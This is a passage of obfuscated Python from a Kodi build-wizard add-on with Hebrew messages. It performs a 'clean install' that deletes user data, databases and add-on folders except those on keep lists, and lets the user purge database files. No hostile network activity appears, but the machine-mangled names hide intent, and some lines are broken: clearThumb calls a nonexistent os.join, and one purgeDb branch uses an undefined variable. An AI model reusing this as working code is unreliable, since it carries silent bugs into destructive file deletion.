				elif O0000OOO0OO0OO0OO =='MyVideos116.db'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4957
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4958
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'skin.anonymous.mod'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4959
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'skin.Premium.mod'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4960
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'skin.anonymous.nox'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4961
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'skin.phenomenal'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4962
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.metalliq'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4963
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'skin.titan'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4965
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'pvr.iptvsimple'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4966
				elif O0000OOO0OO0OO0OO =='sources.xml'and O0O0O00O000OOOO00 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4968
				elif O0000OOO0OO0OO0OO =='quicknav.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4971
				elif O0000OOO0OO0OO0OO =='x1101.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4972
				elif O0000OOO0OO0OO0OO =='b-srtym-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4973
				elif O0000OOO0OO0OO0OO =='x1102.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4974
				elif O0000OOO0OO0OO0OO =='b-sdrvt-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4975
				elif O0000OOO0OO0OO0OO =='x1112.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4976
				elif O0000OOO0OO0OO0OO =='b-tlvvyzyh-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4977
				elif O0000OOO0OO0OO0OO =='x1111.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4978
				elif O0000OOO0OO0OO0OO =='b-tvknyshrly-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4979
				elif O0000OOO0OO0OO0OO =='x1110.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4980
				elif O0000OOO0OO0OO0OO =='b-yldym-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4981
				elif O0000OOO0OO0OO0OO =='x1114.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4982
				elif O0000OOO0OO0OO0OO =='b-mvzyqh-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4983
				elif O0000OOO0OO0OO0OO =='mainmenu.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4984
				elif O0000OOO0OO0OO0OO =='skin.Premium.mod.properties'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4985
				elif O0000OOO0OO0OO0OO =='x1122.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4987
				elif O0000OOO0OO0OO0OO =='b-spvrt-b.DATA.xml'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4988
				elif O0000OOO0OO0OO0OO =='favourites.xml'and O0O0O00O000OOOO00 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4993
				elif O0000OOO0OO0OO0OO =='guisettings.xml'and O0O0O00O000OOOO00 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4995
				elif O0000OOO0OO0OO0OO =='profiles.xml'and O0O0O00O000OOOO00 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4996
				elif O0000OOO0OO0OO0OO =='advancedsettings.xml'and O0O0O00O000OOOO00 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4997
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4998
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'program.apollo'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4999
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5000
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.telemedia'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5001
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.elementum'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5004
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5006
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'weather.yahoo'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5007
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.quasar'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5008
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'program.apollo'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5009
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5010
				elif O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5011
				elif O0000OOO0OO0OO0OO in LOGFILES :wiz .log ("Keep Log File: %s"%O0000OOO0OO0OO0OO ,xbmc .LOGNOTICE )#line:5012
				elif O0000OOO0OO0OO0OO .endswith ('.db'):#line:5013
					try :#line:5014
						if O0000OOO0OO0OO0OO ==O00OOO0O000OO0O00 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0000OOO0OO0OO0OO ,KODIV ),xbmc .LOGNOTICE )#line:5015
						else :os .remove (os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ))#line:5016
					except Exception as OOOO00OOOO0O0O00O :#line:5017
						if not O0000OOO0OO0OO0OO .startswith ('Textures13'):#line:5018
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5019
							wiz .log ("-> %s"%(str (OOOO00OOOO0O0O00O )),xbmc .LOGNOTICE )#line:5020
							wiz .purgeDb (os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ))#line:5021
				else :#line:5022
					DP .update (int (wiz .percentage (OOOO0OO0OOO0OOO00 ,OOOO0OOOOOO0OOOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOO0OO0OO0OO ),'')#line:5023
					try :os .remove (os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ))#line:5024
					except Exception as OOOO00OOOO0O0O00O :#line:5025
						wiz .log ("Error removing %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:5026
						wiz .log ("-> / %s"%(str (OOOO00OOOO0O0O00O )),xbmc .LOGNOTICE )#line:5027
			if DP .iscanceled ():#line:5028
				DP .close ()#line:5029
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5030
				return False #line:5031
		for OOO0OO00000OOO00O ,O000O0O00OOOO00OO ,O000OO0O00OO0OOOO in os .walk (OO0O0OOO00000O000 ,topdown =True ):#line:5032
			O000O0O00OOOO00OO [:]=[OOO00O000000OOOO0 for OOO00O000000OOOO0 in O000O0O00OOOO00OO if OOO00O000000OOOO0 not in EXCLUDES ]#line:5033
			for O0000OOO0OO0OO0OO in O000O0O00OOOO00OO :#line:5034
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000OOO0OO0OO0OO ),'')#line:5035
			  if O0000OOO0OO0OO0OO not in ["Database","userdata","temp","addons","addon_data"]:#line:5036
			   if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5037
			    if not (O0000OOO0OO0OO0OO =='skin.titan'and KEEPSKIN3 =='true'):#line:5039
			      if not (O0000OOO0OO0OO0OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5040
			       if not (O0000OOO0OO0OO0OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5041
			        if not (O0000OOO0OO0OO0OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5042
			         if not (O0000OOO0OO0OO0OO =='program.apollo'and KEEPINFO =='true'):#line:5043
			          if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5044
			           if not (O0000OOO0OO0OO0OO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5045
			            if not (O0000OOO0OO0OO0OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5046
			             if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5047
			              if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5048
			               if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5049
			                if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5050
			                 if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5051
			                  if not (O0000OOO0OO0OO0OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5052
			                   if not (O0000OOO0OO0OO0OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5053
			                    if not (O0000OOO0OO0OO0OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5054
			                     if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5055
			                      if not (O0000OOO0OO0OO0OO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5056
			                       if not (O0000OOO0OO0OO0OO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5057
			                           if not (O0000OOO0OO0OO0OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5061
			                            if not (O0000OOO0OO0OO0OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5062
			                             if not (O0000OOO0OO0OO0OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5063
			                              if not (O0000OOO0OO0OO0OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5064
			                               if not (O0000OOO0OO0OO0OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5065
			                                  shutil .rmtree (os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),ignore_errors =True ,onerror =None )#line:5067
			if DP .iscanceled ():#line:5068
				DP .close ()#line:5069
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5070
				return False #line:5071
		DP .close ()#line:5072
		wiz .clearS ('build')#line:5073
		if over ==True :#line:5074
			return True #line:5075
		elif install =='restore':#line:5076
			return True #line:5077
		elif install :#line:5078
			buildWizard (install ,'normal',over =True )#line:5079
		else :#line:5080
			if INSTALLMETHOD ==1 :OOO00OO0O0O000000 =1 #line:5081
			elif INSTALLMETHOD ==2 :OOO00OO0O0O000000 =0 #line:5082
			else :OOO00OO0O0O000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5083
			if OOO00OO0O0O000000 ==1 :wiz .reloadFix ('fresh')#line:5084
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5085
	else :#line:5086
		if not install =='restore':#line:5087
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5088
			wiz .refresh ()#line:5089
def clearCache ():#line:5094
		wiz .clearCache ()#line:5095
def fixwizard ():#line:5099
		wiz .fixwizard ()#line:5100
def totalClean ():#line:5102
		wiz .clearCache ()#line:5104
		wiz .clearPackages ('total')#line:5105
		clearThumb ('total')#line:5106
		cleanfornewbuild ()#line:5107
def cleanfornewbuild ():#line:5108
		try :#line:5109
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5110
		except :#line:5111
			pass #line:5112
		try :#line:5113
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5114
		except :#line:5115
			pass #line:5116
		try :#line:5117
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5118
		except :#line:5119
			pass #line:5120
def clearThumb (type =None ):#line:5121
	OO00O0O00OO0OOO00 =wiz .latestDB ('Textures')#line:5122
	if not type ==None :OOOOO0OOOOO0OO00O =1 #line:5123
	else :OOOOO0OOOOO0OO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O0O00OO0OOO00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5124
	if OOOOO0OOOOO0OO00O ==1 :#line:5125
		try :wiz .removeFile (os .join (DATABASE ,OO00O0O00OO0OOO00 ))#line:5126
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O0O00OO0OOO00 )#line:5127
		wiz .removeFolder (THUMBS )#line:5128
	else :wiz .log ('Clear thumbnames cancelled')#line:5130
	wiz .redoThumbs ()#line:5131
def purgeDb ():#line:5133
	OOO0O0000O0OO00O0 =[];O00O00000000O00O0 =[]#line:5134
	for O00O0000O0OOOOO00 ,OOOOOO00O0OOOOOOO ,O0000OOOO0OOOOO0O in os .walk (HOME ):#line:5135
		for OO0O00O0O00OO0O00 in fnmatch .filter (O0000OOOO0OOOOO0O ,'*.db'):#line:5136
			if OO0O00O0O00OO0O00 !='Thumbs.db':#line:5137
				OOOO0O0O0O00OO00O =os .path .join (O00O0000O0OOOOO00 ,OO0O00O0O00OO0O00 )#line:5138
				OOO0O0000O0OO00O0 .append (OOOO0O0O0O00OO00O )#line:5139
				OO0O0O0O0OOO00OO0 =OOOO0O0O0O00OO00O .replace ('\\','/').split ('/')#line:5140
				O00O00000000O00O0 .append ('(%s) %s'%(OO0O0O0O0OOO00OO0 [len (OO0O0O0O0OOO00OO0 )-2 ],OO0O0O0O0OOO00OO0 [len (OO0O0O0O0OOO00OO0 )-1 ]))#line:5141
	if KODIV >=16 :#line:5142
		O0000000OO0O00000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00O00000000O00O0 )#line:5143
		if O0000000OO0O00000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5144
		elif len (O0000000OO0O00000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5145
		else :#line:5146
			for O0O0OOOOO00O00OOO in O0000000OO0O00000 :wiz .purgeDb (OOO0O0000O0OO00O0 [O0O0OOOOO00O00OOO ])#line:5147
	else :#line:5148
		O0000000OO0O00000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00O00000000O00O0 )#line:5149
		if O0000000OO0O00000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5150
		else :wiz .purgeDb (OOO0O0000O0OO00O0 [O0O0OOOOO00O00OOO ])#line:5151
def fastupdatefirstbuild (OOO0OO00000OOOOO0 ):#line:5157
